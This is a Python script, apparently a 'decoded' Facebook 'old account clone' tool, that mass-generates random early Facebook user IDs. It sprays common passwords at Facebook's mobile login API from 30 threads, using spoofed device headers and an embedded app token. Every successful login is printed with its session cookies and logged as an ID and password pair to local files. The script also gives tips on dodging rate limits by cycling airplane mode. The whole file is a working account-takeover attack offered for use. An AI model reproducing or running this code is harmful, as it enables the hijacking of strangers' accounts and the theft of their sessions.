# --> Done Decoded By SHAJON
#FIXED BY SHAJON
#2007,8 SYSTEM ADDED BY SHAJON

import uuid
import base64
import os
import hashlib
import zlib
import subprocess
import time
import platform
import requests
import bs4
import json
import sys
import time
import random
import re
import subprocess
import platform
import struct
import string
import uuid
import base64
import zlib
import marshal
import zlib
import base64
from bs4 import BeautifulSoup
from bs4 import BeautifulSoup as sop
import _socket
import ssl
import certifi
from concurrent.futures import ThreadPoolExecutor as tred
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from io import BytesIO
import datetime
from urllib.parse import urlencode
os.system('clear')
#os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
#os.system('pip uninstall pycurl -y && pip install pycurl')
os.system('xdg-open https://t.me/premium_sofware_apps')
os.system('clear')
import pycurl
white = '\x1b[1;97m'
yelloww = '\x1b[1;33m'
green = '\x1b[38;5;49m'
G0 = '\x1b[38;5;155m'
green1 = '\x1b[38;5;154m'
G2 = '\x1b[38;5;47m'
G3 = '\x1b[38;5;48m'
G4 = '\x1b[38;5;49m'
G5 = '\x1b[38;5;50m'
G6 = '\x1b[38;5;52m'
s = '\x1b[0m'
W = '\x1b[1;30m'
Y = '\x1b[1;93m'
red = '\x1b[38;5;160m'
B = '\x1b[1;95m'
BE = '\x1b[1;35m'
X = '\x1b[1;96m'
Z = '\x1b[1;95m'
Y = '\x1b[1;93m'
U = '\x1b[1;94m'
V = '\x1b[38;5;47m'
T = '\x1b[38;5;48m'
Q = '\x1b[38;5;49m'
P = '\x1b[38;5;50m'
O = '\x1b[38;5;51m'
N = '\x1b[38;5;52m'
M = '\x1b[38;5;205m'
L = '\x1b[96;1m'
K = '\x1b[1;91m'
WH = '\x1b[1;97m'
orange = '\x1b[38;5;196m'
yellow = '\x1b[38;5;208m'
black = '\x1b[1;30m'
pink = '\x1b[1;35m'
rad = '\x1b[38;5;160m'
YLW = '\x1b[1;33m'
blue = '\x1b[38;5;6m'
purple = '\x1b[1;35m'
cyan = '\x1b[1;36m'
white = '\x1b[1;37m'
faltu = '\x1b[1;47m'
pvt = '\x1b[1;0m'
gren = '\x1b[38;5;154m'
gas = '\x1b[1;32m'
style = f'''{white}[{red}●{white}]'''
os.system('clear')

import pycurl
from io import BytesIO
import certifi
import sys
import time
import random
import os

# Function to make a cURL request
def py_curl(url):
    curl = pycurl.Curl()
    buffer = BytesIO()
    curl.setopt(curl.URL, url)
    curl.setopt(curl.WRITEDATA, buffer)
    curl.setopt(curl.SSL_VERIFYPEER, 1)
    curl.setopt(curl.SSL_VERIFYHOST, 2)
    curl.setopt(curl.CAINFO, certifi.where())
    
    try:
        curl.perform()
        response_body = buffer.getvalue().decode('utf-8')
    except pycurl.error as e:
        curl.close()
        return f"An error occurred: {e}"
    finally:
        curl.close()
    
    return response_body

# Function to print text with a typing effect
import sys
import time

def tarek(z):
    for a in z + '\n':
        sys.stdout.write(a)
        sys.stdout.flush()
        time.sleep(0.05)

# Ensure pystyle is installed
try:
    import pystyle
except ImportError:
    print("installing pystyle...")
    time.sleep(0.5)
    os.system('pip install pystyle')
    import pystyle
    os.system('clear')

# Import necessary components from pystyle
from pystyle import Colors, Colorate

# Function to generate a random User-Agent string
def ua():
    ver = str(random.choice(range(77, 500)))
    ver2 = str(random.choice(range(57, 77)))
    return f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ver}.0.0.{ver2} Safari/537.36"
    
import random

def Samsung():
    # Random Android version
    Anderson = random.choice([
        '10', '13', '7.0.0', '7.1.1', '9', '12', '11', '9.0', 
        '8.0.0', '7.1.2', '7.0', '4', '5', '4.4.2', '5.1.1', 
        '6.0.1', '9.0.1'
    ])
    
    # Random Samsung model
    model = random.choice([
        'GT-I9505', 'SM-T835', 'SM-S901U', 'MMB29K', 'SM-S134DL', 
        'SM-J250F', 'SM-A217F', 'SM-A326B', 'SM-A125F', 'SM-A720F', 
        'SM-A326U', 'SM-G532M', 'SM-J410G', 'SM-A205GN', 'SM-A505GN', 
        'SM-G930F', 'SM-J210F', 'SM-N9005', 'SM-J210F'
    ])
    
    # Random integers for various parts of the User-Agent
    vir = str(random.randint(111111111, 999999999))
    cho = str(random.randint(43, 447))
    
    # Random Facebook application info
    fb = random.choice([
        'com.facebook.katana|FB4A',
        'com.facebook.orca|Orca-Android'
    ])
    FBAN, platform = fb.split('|')
    
    # User-Agent string creation
    ua = (
        f'Dalvik/2.1.0 (Linux; U; Android {Anderson}; {model} Build/LRX22C) '
        f'[FBAN/{FBAN};FBAV/{cho}.0.0.15.89;FBPN/{platform};FBLC/sv_SE;'
        f'FBBV/{vir};FBCR/S COMVIQ;FBMF/samsung;FBBD/samsung;FBDV/{model};'
        f'FBSV/5.0.1;FBCA/armeabi-v7a:armeabi;FBDM/{{density={random.randint(1, 3)}.0,'
        f'width={random.randint(720, 1500)},height={random.randint(1500, 2000)}}};'
        f'FB_FW/1;]'
    )
    
    return ua

def linex():
    print(f'''{white}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
version = "DECODED"
logo = Colorate.Horizontal(Colors.green_to_white, '╔═╗╦  ╦╗  ╦ ╦╗  ╔═╗╦  ╔═╗╔╗╔╔═╗\n║ ║║  ║║  ║ ║║  ║  ║  ║ ║║║║║╣ \n╚═╝╩═╝╩╝  ╩ ╩╝  ╚═╝╩═╝╚═╝╝╚╝╚═╝ MR-TAREK')
info = f'''{style}{green} FACEBOOK {white}  ➤ {green}MD TAREK HOSSEN\n{style}{green} STATUS   {white}  ➤ {green}{version}\n{style}{green} GITHUB   {white}  ➤ {green}github.com/MR-TAREK-404\n{style}{green} DECODED BY {white}➤ {red}SHAJON'''

def main_logo():
    os.system('clear')
    print(logo)
    linex()
    print(info)
    linex()

(oks, loop, ua, ussr, tw, cps) = ([], 0, [], [], [], [])

def main():
    main_logo()
    
    # Options menu
    print(f'''[A] START 20011-14 CLONE''')
    print(f'''[B] START 2009-10 CLONE''')
    print(f'''[C] JOIN PUBLIC GROUP''')
    print(f'''[O] EXIT THIS PROGRAM''')
    
    linex()
    
    # User selection
    year_select = input('[?] SELECT ▶︎ ')
    
    if year_select in ('A', 'a', '01', '1'):
        os.system('xdg-open https://t.me/premium_sofware_apps')
        old_2011_2014()
    elif year_select in ('B', 'b', '02', '2'):
        os.system('xdg-open https://t.me/premium_sofware_apps')
        old_2009_2010()
    elif year_select in ('C', 'c', '03', '3'):
        os.system('xdg-open https://t.me/premium_sofware_apps')
        main()
    elif year_select in ('O', 'o', '00', '0'):
        os.system('xdg-open https://t.me/premium_sofware_apps')
        os.system('exit')
    else:
        print("Invalid selection. Please try again.")
        main()  # Re-call main to allow for a valid selection

# Calling the main function to start the program

    
def old_2011_2014():
    user = []
    main_logo()
    
    # Prompt for limit input
    print(f'''{style}{green} EXAMPLE {white}: {green} 10000 20000 50000 99999''')
    linex()
    limit = int(input(f'''{style} {green}ENTER LIMITS {white}▶︎ {green}'''))
    
    year_code = '1000000'
    clone_system = '2011-2014'
    
    # Method selection
    main_logo()
    print(f'''{white}[{red}A{white}]{green} METHOD-{red}[{white}M1{red}]''')
    print(f'''{white}[{red}B{white}]{green} METHOD-{red}[{white}M2{red}]''')
    linex()
    method = input(f'''{white}[{red}?{white}]{green} SELECT {white}▶︎ ''').strip().lower()
    
    # Generate user IDs
    for i in range(limit):
        data = str(random.choice(range(10000000, 99999999)))
        user.append(data)

    # ThreadPool for concurrent execution
    mr_tarek = ThreadPool(max_workers=30)
    
    # Display summary before starting
    main_logo()
    print(f'''{style}{green} TOTAL IDS {cyan} »{white} {len(user)}{red} ┼{green} SERVER {cyan} »{white} {clone_system}''')
    print(f'''{style}{green} ID LOGIN AFTER 3 DAYS FOR GOOD RESULT''')
    print(f'''{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN''')
    linex()

    # Submit tasks based on the selected method
    for mal in user:
        uid = year_code + mal
        if method in ('01', '1', 'a'):
            mr_tarek.submit(_method_A_, uid, user)
        elif method in ('02', '2', 'b'):
            mr_tarek.submit(_method_B_, uid, user)
        else:
            print('SELECTED OPTION NOT FOUND')
"""
    print('')
    linex()
    print(f'''{style}{green} THE PROCESS HAS BEEN COMPLETED''')
    print(f'''{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}''')  # Assuming `oks` is `user` here
    linex()
    exit()
"""
def old_2009_2010():
    user = []
    main_logo()
    
    # Prompt for limit input
    print(f'''{style}{green} EXAMPLE {white}: {green} 10000 20000 50000 99999''')
    linex()
    limit = int(input(f'''{style} {green}ENTER LIMITS {white}▶︎ {green}'''))
    
    year_code = '100000'
    clone_system = '2009-2010'
    
    # Method selection
    main_logo()
    print(f'''{white}[{red}A{white}]{green} METHOD-{red}[{white}M1{red}]''')
    print(f'''{white}[{red}B{white}]{green} METHOD-{red}[{white}M2{red}]''')
    linex()
    method = input(f'''{white}[{red}?{white}]{green} SELECT {white}▶︎ ''').strip().lower()
    
    # Generate user IDs
    for i in range(limit):
        data = str(random.choice(range(100000000, 999999999)))
        user.append(data)

    # ThreadPool for concurrent execution
    mr_tarek = ThreadPool(max_workers=30)
    
    # Display summary before starting
    main_logo()
    print(f'''{style}{green} TOTAL IDS {cyan} »{white} {len(user)}{red} ┼{green} SERVER {cyan} »{white} {clone_system}''')
    print(f'''{style}{green} ID LOGIN AFTER 3 DAYS FOR GOOD RESULT''')
    print(f'''{style}{green} TURN {green}[{white}ON{red}/{white}OFF{green}]{green} AIRPLANE MODE EVERY 5{green} MIN''')
    linex()

    # Submit tasks based on the selected method
    for mal in user:
        uid = year_code + mal
        if method in ('01', '1', 'a'):
            mr_tarek.submit(_method_A_, uid, user)
        elif method in ('02', '2', 'b'):
            mr_tarek.submit(_method_B_, uid, user)
        else:
            print('SELECTED OPTION NOT FOUND')
"""
    print('')
    linex()
    print(f'''{style}{green} THE PROCESS HAS BEEN COMPLETED''')
    print(f'''{style} {green}TOTAL OK {white}▶︎ {green}{len(oks)}''')
    linex()
    exit()
    
"""
def _method_A_(uid, user):
    global loop
    Session = requests.Session()
    agent = Samsung()
    
    sys.stdout.write(f'''\r\r{rad}[{green}FINDING-M1{rad}]{white}~{rad}[\x1b[1;97m{loop}{rad}]{white}~{rad}[{green1}CREAKED{white}•{green}{len(oks)}{rad}]''')
    sys.stdout.flush()
    
    try:
        for pw in ['123456', '1234567', '12345678', '123456789', '123123']:
            headers = {
                'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': agent,
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger'
            }
            url = ('https://b-api.facebook.com/method/auth.login?format=json&email=' +
                   str(uid) + '&password=' + str(pw) + 
                   '&credentials_type=device_based_login_password&generate_session_cookies=1' +
                   '&error_detail_type=button_with_disabled&source=device_based_login' +
                   '&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US' +
                   '&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.' +
                   'HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32' +
                   '&fb_api_req_friendly_name=authenticate&cpl=true')
            
            mtd_B = Session.get(url, headers=headers).json()
            
            if 'session_key' in mtd_B:
                cookies = mtd_B.get("session_cookies", [])
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                oks.append(uid)
                print(f'\r\r{green}[SUCCESS] {uid} » {pw}')
                print(f'\r\r{green}[COOKIES] » {coki}')
                with open('/sdcard/MR-TAREK-OLD-M1-OK.txt', 'a') as file:
                    file.write(uid + '|' + pw + '\n')
                break
                    
            elif 'Please Confirm Email' in str(mtd_B):
                cookies = mtd_B.get("session_cookies", [])
                coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                print(f'\r\r{green}[COOKIES] » {coki}')
                oks.append(uid)
                print(f'\r\r{pink}[SUCCESS] {uid} » {pw}')
                with open('/sdcard/MR-TAREK-OLD-M1-OKK.txt', 'a') as file:
                    file.write(uid + '|' + pw + '\n')
                break
            else:
                continue
        loop += 1
    except Exception as e:
        pass
def _method_B_(uid, user):
    global loop
    Session = requests.Session()
    agent = Samsung()
    
    sys.stdout.write(f'''\r\r{rad}[{green}FINDING-M2{rad}]{white}~{rad}[\x1b[1;97m{loop}{rad}]{white}~{rad}[{green1}CREAKED{white}•{green}{len(oks)}{rad}]''')
    sys.stdout.flush()
    
    try:
        for pw in ['123456', '1234567', '12345678', '123456789', '123123']:
            headers = {
                'x-fb-connection-bandwidth': str(random.randint(2e+07, 3e+07)),
                'x-fb-sim-hni': str(random.randint(20000, 40000)),
                'x-fb-net-hni': str(random.randint(20000, 40000)),
                'x-fb-connection-quality': 'EXCELLENT',
                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                'user-agent': agent,
                'content-type': 'application/x-www-form-urlencoded',
                'x-fb-http-engine': 'Liger'
            }
            url = ('https://b-api.facebook.com/method/auth.login?format=json&email=' +
                   str(uid) + '&password=' + str(pw) + 
                   '&credentials_type=device_based_login_password&generate_session_cookies=1' +
                   '&error_detail_type=button_with_disabled&source=device_based_login' +
                   '&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US' +
                   '&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.' +
                   'HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32' +
                   '&fb_api_req_friendly_name=authenticate&cpl=true')
            
            mtd_B = Session.get(url, headers=headers).json()
            
            if 'session_key' in mtd_B:
                cookies = mtd_B.get("session_cookies", [])
                print(f'\r\r{green}[SUCCESS] {uid} » {pw}')
                if cookies:
                    coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                    print(f'\r\r{green}[COOKIES] » {coki}')
                else:
                    print(f'\r\r{red}[COOKIES] » COOKIES NOT FOUND')
                    
                oks.append(uid)
                with open('/sdcard/MR-TAREK-OLD-M2-OK.txt', 'a') as file:
                    file.write(uid + '|' + pw + '\n')
                break
                    
            elif 'Please Confirm Email' in str(mtd_B):
                cookies = mtd_B.get("session_cookies", [])
                print(f'\r\r{pink}[SUCCESS] {uid} » {pw}')
                if cookies:
                    coki = ";".join(i["name"] + "=" + i["value"] for i in cookies)
                    print(f'\r\r{green}[COOKIES] » {coki}')
                else:
                    print(f'\r\r{red}[COOKIES] » COOKIES NOT FOUND')
                    
                oks.append(uid)
                with open('/sdcard/MR-TAREK-OLD-M2-OKK.txt', 'a') as file:
                    file.write(uid + '|' + pw + '\n')
                break
            else:
                continue
        loop += 1
    except Exception as e:
        pass

main()
